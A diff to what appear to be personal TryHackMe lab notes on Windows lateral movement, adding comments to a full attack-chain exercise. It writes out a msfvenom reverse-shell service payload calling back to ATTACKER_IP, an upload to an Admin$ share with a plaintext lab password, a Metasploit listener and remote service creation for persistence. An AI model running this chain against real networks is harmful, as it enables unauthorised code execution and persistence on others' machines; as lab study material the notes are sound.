@@ -337,17 +337,17 @@ schtasks /s TARGET /run /TN "THMtask1"
 
 ### Putting It All Together — Full Attack Chain (Exercise)
 
-1. Generate a service‑safe reverse shell payload:
+1. Generate a service‑safe reverse shell payload ():
 ```
 msfvenom -p windows/shell/reverse_tcp -f exe-service \
 LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
 ```
-2. Upload payload to THMIIS Admin$ share:
+2. Upload payload to THMIIS Admin$ share (PC we laterally move to):
 ```
 smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA \
 '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
 ```
-3. Start listener:
+3. Start listener (try with and without \ for next line if fails):
 ```
 msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; \
 set LHOST lateralmovement; set LPORT 4444; exploit"
@@ -361,9 +361,9 @@ runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers \
 ```
 nc -lvp 4443
 ```
-6. Create remote service pointing to uploaded payload:
+6. Create remote service pointing to uploaded payload (the persistence element keep shell open):
 ```
 sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
 sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
 ```
-7. Reverse shell fires → access THMIIS → run flag.exe.
+7. Reverse shell fires → access THMIIS → run flag.exe. 
